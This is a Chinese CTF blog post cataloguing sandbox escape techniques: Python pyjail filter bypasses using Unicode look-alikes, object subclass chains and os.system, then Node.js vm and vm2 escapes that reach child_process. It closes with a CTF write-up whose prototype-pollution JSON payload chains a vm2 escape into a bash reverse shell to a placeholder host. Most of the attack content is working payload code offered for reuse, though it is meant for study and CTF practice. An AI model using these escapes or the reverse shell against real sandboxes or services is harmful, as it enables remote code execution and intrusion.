# MIsc-沙箱逃逸

**这篇博客用来记录一下沙箱逃逸相关的一些知识点**
<!--more-->

## Python 沙箱逃逸(pyjail)

获取常用的unicode碰撞字符

```python
from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict
lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize("NFKC", chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) > 9:
            break
for key,value in dic.items():
    print(key,value)
```

```
a ['a', 'ª', 'ᵃ', 'ₐ', 'ⓐ', 'ａ', '𝐚', '𝑎', '𝒂', '𝒶']
b ['b', 'ᵇ', 'ⓑ', 'ｂ', '𝐛', '𝑏', '𝒃', '𝒷', '𝓫', '𝔟']
c ['c', 'ᶜ', 'ⅽ', 'ⓒ', 'ｃ', '𝐜', '𝑐', '𝒄', '𝒸', '𝓬']
d ['d', 'ᵈ', 'ⅆ', 'ⅾ', 'ⓓ', 'ｄ', '𝐝', '𝑑', '𝒅', '𝒹']
e ['e', 'ᵉ', 'ₑ', 'ℯ', 'ⅇ', 'ⓔ', 'ｅ', '𝐞', '𝑒', '𝒆']
f ['f', 'ᶠ', 'ⓕ', 'ｆ', '𝐟', '𝑓', '𝒇', '𝒻', '𝓯', '𝔣']
g ['g', 'ᵍ', 'ℊ', 'ⓖ', 'ｇ', '𝐠', '𝑔', '𝒈', '𝓰', '𝔤']
h ['h', 'ʰ', 'ₕ', 'ℎ', 'ⓗ', 'ｈ', '𝐡', '𝒉', '𝒽', '𝓱']
i ['i', 'ᵢ', 'ⁱ', 'ℹ', 'ⅈ', 'ⅰ', 'ⓘ', 'ｉ', '𝐢', '𝑖']
j ['j', 'ʲ', 'ⅉ', 'ⓙ', 'ⱼ', 'ｊ', '𝐣', '𝑗', '𝒋', '𝒿']
k ['k', 'ᵏ', 'ₖ', 'ⓚ', 'ｋ', '𝐤', '𝑘', '𝒌', '𝓀', '𝓴']
l ['l', 'ˡ', 'ₗ', 'ℓ', 'ⅼ', 'ⓛ', 'ｌ', '𝐥', '𝑙', '𝒍']
m ['m', 'ᵐ', 'ₘ', 'ⅿ', 'ⓜ', 'ｍ', '𝐦', '𝑚', '𝒎', '𝓂']
n ['n', 'ⁿ', 'ₙ', 'ⓝ', 'ｎ', '𝐧', '𝑛', '𝒏', '𝓃', '𝓷']
o ['o', 'º', 'ᵒ', 'ₒ', 'ℴ', 'ⓞ', 'ｏ', '𝐨', '𝑜', '𝒐']
p ['p', 'ᵖ', 'ₚ', 'ⓟ', 'ｐ', '𝐩', '𝑝', '𝒑', '𝓅', '𝓹']
q ['q', 'ⓠ', 'ｑ', '𝐪', '𝑞', '𝒒', '𝓆', '𝓺', '𝔮', '𝕢']
r ['r', 'ʳ', 'ᵣ', 'ⓡ', 'ｒ', '𝐫', '𝑟', '𝒓', '𝓇', '𝓻']
s ['s', 'ſ', 'ˢ', 'ₛ', 'ⓢ', 'ｓ', '𝐬', '𝑠', '𝒔', '𝓈']
t ['t', 'ᵗ', 'ₜ', 'ⓣ', 'ｔ', '𝐭', '𝑡', '𝒕', '𝓉', '𝓽']
u ['u', 'ᵘ', 'ᵤ', 'ⓤ', 'ｕ', '𝐮', '𝑢', '𝒖', '𝓊', '𝓾']
v ['v', 'ᵛ', 'ᵥ', 'ⅴ', 'ⓥ', 'ｖ', '𝐯', '𝑣', '𝒗', '𝓋']
w ['w', 'ʷ', 'ⓦ', 'ｗ', '𝐰', '𝑤', '𝒘', '𝓌', '𝔀', '𝔴']
x ['x', 'ˣ', 'ₓ', 'ⅹ', 'ⓧ', 'ｘ', '𝐱', '𝑥', '𝒙', '𝓍']
y ['y', 'ʸ', 'ⓨ', 'ｙ', '𝐲', '𝑦', '𝒚', '𝓎', '𝔂', '𝔶']
z ['z', 'ᶻ', 'ⓩ', 'ｚ', '𝐳', '𝑧', '𝒛', '𝓏', '𝔃', '𝔷']
```

### 常见的绕过方法

```python
__import__("os").system('cat flag')
```

```python
open("flag").read()
```

```python
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```

```python
#先输入eval(input())绕过字数限制
print(open(chr(102)+chr(108)+chr(97)+chr(103)).read())
```

```python
#使用Unicode字符绕过过滤
ᵉval(inpᵘt())
```

```python
#使用breakpoint()函数下断点进入Pdb，然后再输入命令
```

```python
#输入help()
#再输入sys
#然后输入!cat flag获取flag

#在help()中可以输入__main__或者__dict__查看是否有信息泄露
```

```python
#使用bytes([]).decode()来绕过chr的decode
open((bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode()).read()
```

```python
#获取object的子类列表中倒数第四个子类的__init__方法的全局变量中名为'system'的对象
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(bytes([115])+bytes([121])+bytes([115])+bytes([116])+bytes([101])+bytes([109])).decode()]((bytes([99])+bytes([97])+bytes([116])+bytes([32])+bytes([102])+bytes([108])+bytes([97])+bytes([103])).decode())
```

```python
#如果过滤了bytes，可以用type(str(1).encode())绕过
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())
#system('ls')
```

一些方法的type构造

```
str = type(str(0))
list = type(type(flag).mro())(flag)
bytes = type(flag.encode())
bool = type(flag.istitle())
int = type(flag.find(flag))
tuple = type(flag.partition(flag))
```

```python
#如果+被过滤，可以使用.__add__(xxx)来绕过
#自动生成Payload的脚本:
command = "cat flag_y0u_CaNt_FiNd_mE"
mylist = []
system = "[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]"
print(system,end='')
for i in command:
    mylist.append(f"type(str(1).encode())([{ord(i)}])")
print("("+mylist.pop(0),end='')
# 删除并打印出列表的第一个元素
for item in mylist:
    print(f".__add__({item})",end='')
print(")",end='')
```

```python
#type被过滤了可以使用list(dict(system=114514))[0]获取system这个字符串
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
```

```python
#可以使用dir()函数查看类中的方法和变量名
#如果有encode方法就可以读取flag
> my_flag.flag_level5.encode()
```

```python
#可以输入globals()函数查看全局变量中是否有信息泄露
#可以输入vars()函数查看全局变量中是否有信息泄露
```

```python
#利用__import__()函数动态导入模块
__import__("sys").__stdout__.write(__import__("os").read(__import__("os").open("flag",__import__("os").O_RDONLY), 0x114).decode())
#__import__("sys").__stdout__.write()从sys模块中获取stdout并调用write方法讲内容输出到控制台
#__import__("os").read()从os模块中调用read方法去读取文件内容，读取文件的前0x114(276)个字节
#__import__("os").open()从os模块中调用open方法打开一个名为flag 的文件，并设置为只读模式
```

```python
#利用lambda匿名函数来读取flag
(lambda:os.system('cat flag'))()
```

## VM沙箱逃逸

### VM沙箱逃逸

示例代码

```js
// 引入Nodejs标准库中的vm模块
const vm = require('vm');
sandbox = {
    'name': 'someone',
    'age': 18
}
// 创建一个沙箱对象，在这个上下文中执行的代码只能访问sandbox中的属性
context = vm.createContext(sandbox)
// vm.runInThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。可以访问到global上的全局变量，但是访问不到自定义的变量
const result = vm.runInThisContext("process.mainModule.require('child_process').exec('calc')", context);
console.log(result)
```

执行命令需要child_process模块，但是在沙箱环境中不能直接require引入child_process

但是我们可以通过process对象获取

```js
const vm = require('vm');
//这里的this指向vm创建的context,然后通过原型链的方式拿到Function
const y1 = vm.runInNewContext(`this.toString.constructor("return process")();`);
//只要是外部的引用的特性，都可以用来获取并进行逃逸
//context = vm.createContext({a:[]})
//const result = vm.runInNewContext(`a.constructor.constructor("return process")()`,context);
console.log(y1.mainModule.require('child_process').exec('calc'));

```

对以上代码的防护手段(将上下文对象的原型链设置为null)

```js
const vm = require('vm');
context = Object.create(null);
const result = vm.runInNewContext(`this.constructor.constructor("return process")()`, context);
//原型对象设置为null，所以this就无法通过二次constructor获取Function的原型对象
result.mainModule.require('child_process').exec('calc')
console.log(result)
```

针对上述防护的绕过方法

```js
// 前置知识
arguments是一个object对象，储存了每个调用函数中的相关参数
arguments.callee是arguments的一个成员，它的值是正在被执行的Function对象
arguments.callee.caller调用当前函数的外层函数，如果是单函数无嵌套的话就是null
```

```js
//绕过代码1——使用arguments.callee.caller实现绕过
const vm = require('vm');
const res = vm.runInContext(`
    function test(){
        const a = {}
        a.toString = function () {
            //获取调用当前函数的函数
            const cc = arguments.callee.caller;
            //利用函数的constructor来访问Function构造函数
            //再次利用constructor来绕过沙箱限制获取process对象
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('calc').toString()
        }
        return a
    }
	test();`,
    vm.createContext(Object.create(null)));
// 强制将res转换为字符串，因此触发了tostring方法即我们上面自定义的tostring方法
// 从而绕过沙箱的限制实现了RCE
console.log("" + res)
```

```js
//绕过代码2——使用VM沙箱Proxy代理绕过
const vm = require('vm');
//value是{}对象传入的，而{}对象在外部作用域下
const code3 = `new Proxy({}, {
    set: function(me, key, value) {
        (value.constructor.constructor('return process'))().mainModule.require('child_process').execSync('calc').toString()
    }
})`;
//在特定的上下文中运行code3
data = vm.runInContext(code3, vm.createContext(Object.create(null)));
//设置data对象的一个属性时，就会触发我们之前定义的Proxy对象的"set"拦截器
data['some_key'] = {};
```

### VM2沙箱逃逸

> vm2基于vm开发，使用官方的vm库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸

VM2代码包中主要用到的四个文件

```
cli.js:实现vm2的命令行调用
contextify.js:封装了三个对象， Contextify 和 Decontextify ，并且针对 global 的Buffer类进行了代理
main.js:vm2执行的入口，导出了 NodeVM, VM 这两个沙箱环境，还有一个 VMScript 实际上是封装了 vm.Script
sandbox.js:针对 global 的一些函数和变量进行了hook，比如 setTimeout，setInterval 等
```

示例代码

```js
//从vm2模块导入了两个主要的类：VM和VMScript
const {VM, VMScript} = require("vm2");
//使用VMScript创建脚本并在VM中执行
console.log(new VM().run(new VMScript("let a = 2;a")));
```

```js
//绕过代码
// 启用严格模式
"use strict";
// 屏蔽原始的process对象
var process;
// 为所有对象添加了一个 has 方法
// 当这个新的 has 方法被调用时，它会尝试使用传入的对象 t 的构造函数来创建并返回 process 对象。
Object.prototype.has = function (t, k) {
    process = t.constructor("return process")();
};
// 触发原型链污染
// 这里使用了 in 运算符来检查空字符串 "" 是否为 Buffer.from 的一个属性。
// 这个检查会触发上面定义的 has 方法（因为 in 运算符在查找属性时会调用内部的[[HasProperty]] 方法，而这在某些情况下可以被 has 方法拦截）
"" in Buffer.from;
process.mainModule.require("child_process").execSync("whoami").toString()
```

js的三个属性：数据属性、访问器属性、内部属性

```
数据属性和访问器属性都存在 [[Enumerable]] 和 [[Configurable]] 特性
Enumerable 特性用于控制属性是否可以被 for...in 循环遍历以及是否可以通过 Object.keys()、Object.values()、Object.entries() 等方法获取到
Configurable 特性用于控制属性是否可以被删除或修改。
```

数据属性

```
数据属性包含一个可以读取和写入属性值的变量，并且Writable控制这个值是否可改变，默认可改变
```

访问器属性

```
访问器属性不包含数据值，而是包含一对 getter 和 setter 函数，默认为 undefined
设置对象的访问器属性，也就个get、set属性
```

内部属性

```
内部属性是 JavaScript 引擎内部使用的属性，不能直接访问它们
例如：Prototype，想要访问Prototype得使用__proto__
```

```js
//绕过代码
"use strict";
//启用严格模式，从vm2库中引入VM类
const {VM} = require('vm2');
//屏蔽原有的process对象
// Object.defineProperty() 是用于在对象上定义一个新属性，或修改已有的属性。
// 语法：Object.defineProperty(obj, prop, descriptor)
// 其中，obj 是需要定义属性的对象，
//		prop 是需要定义或修改的属性名，
//		descriptor 是一个 JavaScript 对象
//在Buffer.from("")对象上定义一个空字符串属性
//在Object.prototype上定义一个名为get的属性
//当访问这个get属性时，它会抛出一个异常，异常是一个函数，该函数能够返回process对象
//在异常处理中，代码通过e(() => {})的形式来调用被篡改的Object.prototype.get方法，尝试获取到process对象。
//在这个过程中，篡改的Object.prototype.get方法会被调用，抛出一个返回process的函数，从而获取到process对象
const untrusted = `var process;
try{
    Object.defineProperty(Buffer.from(""), "", {get set(){
        Object.defineProperty(Object.prototype,"get",{get(){
            throw x=>x.constructor("return process")();
        }});
        return ()=>{};
    }});
}catch(e){
    process = e(()=>{});
}
process.mainModule.require("child_process").execSync("id").toString();`;
try{
    console.log(new VM().run(untrusted));
}catch(x){
    console.log(x);
}
```

### 示例题目

#### 例题-2023HZNUCTF eznode

用工具扫描，找到源码在app.py中，以下分析关键代码

```js
const backdoor = function () {
    //需要使用原型链污染来污染空对象的shellcode从而实现RCE
    try {
        new VM().run({}.shellcode);
    } catch (e) {
        console.log(e);
    }
}
app.post('/', function (req, res) {
    try {
        console.log(req.body)
        var body = JSON.parse(JSON.stringify(req.body));
        var copybody = clone(body)
        //copy.body的shit属性为True时才会调用backdoor()
        if (copybody.shit) {
            backdoor()
        }
        res.send("post shit ok")
    }catch(e){
        res.send("is it shit ?")
        console.log(e)
    }
})
```

存在Nodejs原型链污染和VM2沙箱逃逸

最后生成的payload如下，把ip和port改成自己的vps弹shell即可

- let res = import('./app.js');会返回一个Promise对象

- 任何对象的 `toString` 方法都是从 `Function` 对象继承而来的。
- `Function` 对象的 `constructor` 属性引用了 `Function` 构造函数本身
- res.toString.constructor("return this")()返回了全局上下文global，从而获得了全局上下文的引用，可以进一步访问process

```json
{
    "shit": 1,
    "__proto__": {
        "shellcode": "let res = import('./app.js'); res.toString.constructor(\"return this\") ().process.mainModule.require(\"child_process\").execSync('bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"').toString();"
    }
}
//也可以使用下面这个
{
    "shit": 1,
    "__proto__": {
        "shellcode": "let res = import('./app.js'); res.toString.constructor(\"return process\") ().mainModule.require(\"child_process\").execSync('bash -c \"bash -i >& /dev/tcp/ip/port 0>&1\"').toString();"
    }
}
```






---

> 作者: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/442fd1d/  

